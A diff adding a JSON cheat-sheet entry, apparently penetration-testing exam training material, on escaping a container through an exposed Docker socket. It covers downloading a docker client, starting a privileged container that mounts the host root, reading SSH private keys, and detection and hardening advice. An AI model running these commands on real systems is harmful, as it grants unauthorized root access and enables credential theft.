@@ -1,0 +1,100 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "docker"
+  ],
+  "tags": [
+    "docker",
+    "docker-sock",
+    "container-escape"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Privileged Groups",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Read an SSH key from a bind-mounted host volume",
+      "command": "cd /hostsystem/home/cry0l1t3; cat .ssh/id_rsa"
+    },
+    {
+      "label": "SSH to the host with the recovered key",
+      "command": "ssh cry0l1t3@<host_ip> -i cry0l1t3.priv"
+    }
+  ],
+  "notes": "A container with /var/run/docker.sock (or an app socket) bind-mounted is game over: talk to the Docker API to spawn a new privileged container mounting host / and read root's files or SSH key.",
+  "references": [
+    {
+      "title": "master.dockerproject.com docker binary",
+      "url": "https://master.dockerproject.com/linux/x86_64/docker"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "group-docker",
+      "note": "Same escape from the host side via docker group.",
+      "rel": "alternative"
+    },
+    {
+      "id": "group-lxd-lxc",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "docker-socket-exposed",
+  "name": "Privileged Groups - Exposed Docker Socket (in-container)",
+  "command": "/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app",
+  "description": "A docker.sock mounted inside a container lets you talk to the host Docker daemon. Upload a docker client, spawn a privileged container mounting host /, and read the host's root SSH key.",
+  "steps": [
+    {
+      "label": "1. Get a docker client into the container",
+      "command": "wget https://master.dockerproject.com/linux/x86_64/docker -O docker\nchmod +x docker\n/tmp/docker -H unix:///app/docker.sock ps"
+    },
+    {
+      "label": "2. Spawn privileged container mounting host /",
+      "command": "/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app\n/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash"
+    },
+    {
+      "label": "3. Read host root SSH key",
+      "command": "cat /hostsystem/root/.ssh/id_rsa"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1611"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Docker socket (/var/run/docker.sock) provides full Docker daemon control. If the socket is accessible to a non-root user (mounted in a container, world-writable, or group-accessible), they can use it to create a new privileged container mounting the host root filesystem, effectively gaining root access to the host from within the container.",
+    "prerequisites": "Access to /var/run/docker.sock or a Docker socket in a container. Docker daemon running. docker binary available (or downloadable).",
+    "impact": "Full root access to the host filesystem via a privileged container with host root mounted. Can read /etc/shadow, SSH keys, write cron jobs, or spawn a root shell with chroot.",
+    "detection": "Non-root process accessing /var/run/docker.sock. New container spawned with --privileged flag and host volume mount. Docker audit logs showing unexpected container creation. EDR: docker run command from non-admin user.",
+    "artifacts": "Docker daemon log (new container creation with host volume) | Auditd: open(/var/run/docker.sock) by non-root | Container runtime: privileged container with / mount",
+    "prevention": "Never expose /var/run/docker.sock in containers (avoid -v /var/run/docker.sock:/var/run/docker.sock). Restrict docker group membership -- being in the docker group is equivalent to root. Use rootless Docker or Podman instead. Apply Docker socket access controls (socket proxy with minimal permissions).",
+    "misconfiguration": "Docker socket exposed in a container (mounted as volume). Or non-root user added to the 'docker' group, giving equivalent root access via: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash.",
+    "vulnerable_config": "# Container started with socket mounted\ndocker run -v /var/run/docker.sock:/var/run/docker.sock ...\n\n# Or: non-root user in docker group\nid\n# uid=1000(htb-student) gid=1000(htb-student) groups=...,999(docker)",
+    "secure_config": "# Remove user from docker group\ngpasswd -d htb-student docker\n\n# Use rootless Docker\n# Install: dockerd-rootless-setuptool.sh install\n\n# If socket sharing needed, use socket proxy (haproxy/socat)\n# with allowlist of specific docker API endpoints only",
+    "sources": [
+      "HTB M25",
+      "MITRE T1610",
+      "MITRE T1611"
+    ]
+  }
+}
